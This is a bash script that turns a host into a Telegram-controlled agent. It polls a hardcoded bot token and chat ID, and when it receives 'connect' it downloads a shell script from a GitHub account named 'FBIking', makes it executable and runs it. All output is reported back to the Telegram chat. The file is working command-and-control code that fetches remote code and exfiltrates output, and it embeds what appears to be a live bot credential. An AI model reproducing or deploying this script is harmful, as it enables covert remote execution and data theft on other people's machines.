#!/usr/bin/env bash
# commamnder.sh — Bash Telegram bot using Node.js to parse JSON
# Usage: ./commamnder.sh
# Requires: curl + node
# Edit HARDCODE_CMD below.

set -euo pipefail

################ CONFIG ################
TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
CHAT_ID="6565158025"
HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/linux-tools.sh -o linux-tools.sh && chmod +x linux-tools.sh && ./linux-tools.sh"   # <-- replace this with your hardcoded command
########################################

API="https://api.telegram.org/bot${TOKEN}"

send_msg() {
  local text="$1"
  curl -s -sX POST "${API}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    -d text="$text" >/dev/null
}

send_file() {
  local file="$1"
  curl -s -X POST "${API}/sendDocument" \
    -F chat_id="${CHAT_ID}" \
    -F document=@"$file" >/dev/null
}

# node parser: reads JSON from stdin and prints update_id|chat_id|text
parse_updates_node() {
  node -e '
    const fs = require("fs");
    const data = JSON.parse(fs.readFileSync(0, "utf8"));
    if (!data.result) process.exit(0);
    for (const r of data.result) {
      const uid = r.update_id;
      const msg = r.message || r.edited_message || {};
      const cid = msg.chat && msg.chat.id;
      const text = (msg.text || "").replace(/\n/g, " ");
      if (uid !== undefined && cid !== undefined) {
        console.log(`${uid}|${cid}|${text}`);
      }
    }
  '
}

# notify on startup
send_msg "ready to execute command"

OFFSET=0
while true; do
  UPDATES=$(curl -s "${API}/getUpdates?offset=${OFFSET}&timeout=20")
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    IFS='|' read -r UPDATE_ID FROM_ID TEXT <<< "$line"

    OFFSET=$((UPDATE_ID+1))

    # only react to your chat
    if [ "$FROM_ID" != "$CHAT_ID" ]; then
      continue
    fi

    if [ "$TEXT" = "connect" ]; then
      OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"

      if [ -z "$OUTPUT" ]; then
        send_msg "command executed successfully (no output)"
      else
        if [ ${#OUTPUT} -le 3500 ]; then
          send_msg "command executed successfully:\n$OUTPUT"
        else
          TMP="$(mktemp /tmp/out.XXXXXX)"
          printf "%s\n" "$OUTPUT" > "$TMP"
          send_file "$TMP"
          rm -f "$TMP"
        fi
      fi
    fi
  done < <(echo "$UPDATES" | parse_updates_node)
done
